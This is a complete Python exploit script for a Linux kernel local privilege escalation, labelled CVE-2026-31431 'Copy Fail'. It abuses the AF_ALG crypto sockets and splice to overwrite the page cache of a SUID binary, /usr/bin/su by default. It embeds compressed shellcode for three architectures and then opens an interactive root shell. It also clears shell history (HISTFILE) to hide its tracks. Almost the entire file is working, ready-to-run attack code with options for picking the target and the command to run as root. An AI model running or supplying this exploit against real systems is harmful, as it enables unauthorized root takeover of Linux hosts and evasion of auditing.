#!/usr/bin/env python3
# CVE-2026-31431 - Copy Fail PoC (Python 3.10+)
# For use on authorized systems / lab environments only
# Author: https://github.com/Juguitos

import os, sys, zlib, struct, socket, ctypes, platform
import tty, termios, select, signal, fcntl, array, argparse, time, threading

__version__ = "0.1.0"

AF_ALG                = 38
SOL_ALG               = 279
ALG_SET_KEY           = 1
ALG_SET_IV            = 2
ALG_SET_OP            = 3
ALG_SET_AEAD_ASSOCLEN = 4
ALG_SET_AEAD_AUTHSIZE = 5
MSG_MORE              = 0x8000

PAYLOAD_SH = {
    "x86_64":  "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c00111d10d3",
    "i686":    "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40b806c80461569098000383e101c3db1bae9e6d303c1090a1af5f9c91a19f9499d7f93820b8f361e7a10ddc4089db598c11671b0038b31858",
    "aarch64": "78daab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd06ca5b039787e96cb8e421d47009c8bb0214126004f29980788534540cc4e686b0f59332f3f48b3318003ff61578",
}

PAYLOAD_EXEC = {
    "x86_64":  "789cab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e02e5c1680601086578c0f0ff864c7e568fee1a1501c36f59d61133f9590dff67d944f0b3020082b00eaf",
    "i686":    "789cab77f57163646464800126066606102fa48185c38401014c18141860aae0aa816a40381fc80461569098000383e101c3db1bae9e6de88e51e1303c99c51d31f36c83e1ed2cc688b30d001bf41180",
    "aarch64": "789cab77f5716362646480012686ed0c205e05830398efc080091c182c18603a40342b9a2c32bd04ca5b029787e96cb8e421d47009c8bbf280dbe1272390cf04c42ba4216220f915dc103600d72b1509",
}

libc = ctypes.CDLL("libc.so.6", use_errno=True)


def check_vulnerable():
    try:
        s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
        s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
        s.close()
        print("[+] algif_aead available - system potentially vulnerable")
        return True
    except OSError as e:
        print(f"[-] algif_aead not available: {e}")
        return False


def alg_set_authsize(sock_fd, size):
    ret = libc.setsockopt(sock_fd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, None, size)
    if ret < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))


def alg_accept(alg_fd):
    ufd = libc.accept(alg_fd, None, None)
    if ufd < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return ufd


def do_splice(fd_in, off_in, fd_out, off_out, length, flags=0):
    SYS_SPLICE = 275 if platform.machine() == "x86_64" else 76
    p_in  = ctypes.byref(ctypes.c_int64(off_in))  if off_in  is not None else None
    p_out = ctypes.byref(ctypes.c_int64(off_out)) if off_out is not None else None
    ret = libc.syscall(
        ctypes.c_long(SYS_SPLICE),
        ctypes.c_int(fd_in),  p_in,
        ctypes.c_int(fd_out), p_out,
        ctypes.c_size_t(length),
        ctypes.c_uint(flags),
    )
    if ret < 0:
        raise OSError(ctypes.get_errno(), os.strerror(ctypes.get_errno()))
    return ret


def write_4bytes(alg_fd, file_fd, offset, chunk):
    ufd = alg_accept(alg_fd)
    try:
        iv_data = bytes([0x10]) + b"\x00" * 19
        sock_u = socket.fromfd(ufd, AF_ALG, socket.SOCK_SEQPACKET)
        try:
            sock_u.sendmsg(
                [b"AAAA" + chunk],
                [
                    (SOL_ALG, ALG_SET_OP,            struct.pack("<I", 0)),
                    (SOL_ALG, ALG_SET_IV,            iv_data),
                    (SOL_ALG, ALG_SET_AEAD_ASSOCLEN, struct.pack("<I", 8)),
                ],
                MSG_MORE,
            )
        finally:
            sock_u.detach()

        pr, pw = os.pipe()
        splice_len = offset + 4
        try:
            do_splice(file_fd, 0,    pw,  None, splice_len)
            do_splice(pr,      None, ufd, None, splice_len)
        finally:
            os.close(pr)
            os.close(pw)

        try:
            os.read(ufd, 8 + offset)
        except OSError:
            pass
    finally:
        os.close(ufd)


def get_winsize():
    buf = array.array("H", [0, 0, 0, 0])
    try:
        fcntl.ioctl(sys.stdout.fileno(), termios.TIOCGWINSZ, buf)
    except Exception:
        pass
    return buf[0] or 24, buf[1] or 80


def set_winsize(fd, rows, cols):
    buf = array.array("H", [rows, cols, 0, 0])
    try:
        fcntl.ioctl(fd, termios.TIOCSWINSZ, buf)
    except Exception:
        pass


def write_all(fd, data):
    while data:
        data = data[os.write(fd, data):]


def spawn_pty(cmd, args, auto_setup=True):
    rows, cols = get_winsize()
    master_fd, slave_fd = os.openpty()
    set_winsize(master_fd, rows, cols)

    pid = os.fork()
    if pid == 0:
        os.close(master_fd)
        os.setsid()
        fcntl.ioctl(slave_fd, termios.TIOCSCTTY, 0)
        for i in range(3):
            os.dup2(slave_fd, i)
        if slave_fd > 2:
            os.close(slave_fd)
        os.execv(cmd, args)
        sys.exit(1)

    os.close(slave_fd)

    if auto_setup:
        def inject_setup():
            # Wait for /bin/sh to start
            time.sleep(0.5)
            # Upgrade to bash (shellcode spawns /bin/sh by default)
            try:
                write_all(master_fd, b"bash\n")
            except OSError:
                return
            # Wait for bash to fully load before configuring the environment
            time.sleep(0.5)
            setup = (
                f" stty rows {rows} cols {cols}\n"
                " export TERM=xterm-256color\n"
                " export SHELL=/bin/bash\n"
                " export HISTFILE=\n"
                " stty sane\n"
                " [ -f /etc/skel/.bashrc ] && source /etc/skel/.bashrc 2>/dev/null\n"
                " [ -f ~/.bashrc ] && source ~/.bashrc 2>/dev/null\n"
                " sleep 5\n"
                " reset\n"
            )
            try:
                write_all(master_fd, setup.encode())
            except OSError:
                pass

        threading.Thread(target=inject_setup, daemon=True).start()

    old_tty = termios.tcgetattr(sys.stdin.fileno())

    def restore():
        try:
            termios.tcsetattr(sys.stdin.fileno(), termios.TCSAFLUSH, old_tty)
        except Exception:
            pass

    tty.setraw(sys.stdin.fileno())
    signal.signal(signal.SIGWINCH,
        lambda s, f: set_winsize(master_fd, *get_winsize()))

    try:
        while True:
            try:
                r, _, _ = select.select([sys.stdin, master_fd], [], [], 0.05)
            except (ValueError, OSError):
                break

            if sys.stdin in r:
                data = os.read(sys.stdin.fileno(), 1024)
                if not data:
                    break
                write_all(master_fd, data)

            if master_fd in r:
                try:
                    data = os.read(master_fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                write_all(sys.stdout.fileno(), data)

            if os.waitpid(pid, os.WNOHANG)[0] != 0:
                break
    finally:
        restore()
        os.close(master_fd)
        try:
            os.waitpid(pid, 0)
        except ChildProcessError:
            pass


def run(target, exec_cmd=None, no_setup=False):
    print("[*] CVE-2026-31431 - Copy Fail PoC (Python) [PTY]")
    print(f"[*] Kernel : {platform.release()}")
    print(f"[*] Arch   : {platform.machine()}")
    print(f"[*] Target : {target}")
    if exec_cmd:
        print(f"[*] Exec   : {exec_cmd}")

    if not check_vulnerable():
        sys.exit(1)

    arch = platform.machine()
    payload_map = PAYLOAD_EXEC if exec_cmd else PAYLOAD_SH
    if arch not in payload_map:
        print(f"[-] Arch '{arch}' not supported. Available: {list(payload_map)}")
        sys.exit(1)

    payload = zlib.decompress(bytes.fromhex(payload_map[arch]))
    print(f"[*] Payload: {len(payload)} bytes")

    alg = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
    alg.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    alg.setsockopt(SOL_ALG, ALG_SET_KEY, bytes.fromhex("0800010000000010" + "00" * 32))
    alg_set_authsize(alg.fileno(), 4)

    try:
        file_fd = os.open(target, os.O_RDONLY)
    except PermissionError:
        print(f"[-] Cannot open {target}")
        sys.exit(1)

    print(f"[*] Overwriting page cache of {target}...")
    try:
        total = len(payload)
        for i in range(0, total, 4):
            write_4bytes(alg.fileno(), file_fd, i, payload[i:i+4])
            if i % 200 == 0:
                pct = i * 100 // total
                bar = "#" * (pct // 5) + "-" * (20 - pct // 5)
                print(f"  [{bar}] {i:>5}/{total} ({pct}%)", end="\r", flush=True)
    finally:
        os.close(file_fd)
        alg.close()

    print(f"\n[+] Done. {total} bytes written to page cache.")
    print("[+] Spawning root shell on fully interactive PTY...\n")

    spawn_pty(
        "/usr/bin/su",
        ["su", exec_cmd] if exec_cmd else ["su"],
        auto_setup=not no_setup,
    )
    print("\n[*] Shell closed.")


if __name__ == "__main__":
    p = argparse.ArgumentParser(
        description="CVE-2026-31431 Copy Fail PoC - for authorized use only",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 copy-fail.py\n"
            "  python3 copy-fail.py -t /usr/bin/newgrp\n"
            "  python3 copy-fail.py -e /bin/bash\n"
            "  python3 copy-fail.py --no-setup\n"
        ),
    )
    p.add_argument("--target",   "-t", default="/usr/bin/su", metavar="PATH",
                   help="Target SUID binary (default: /usr/bin/su)")
    p.add_argument("--exec",     "-e", dest="exec_cmd", default=None, metavar="CMD",
                   help="Command to run as root (full path required)")
    p.add_argument("--no-setup", action="store_true",
                   help="Disable automatic terminal setup injection")
    p.add_argument("--version", action="version",
                   version=f"%(prog)s {__version__}")
    args = p.parse_args()
    run(args.target, args.exec_cmd, args.no_setup)
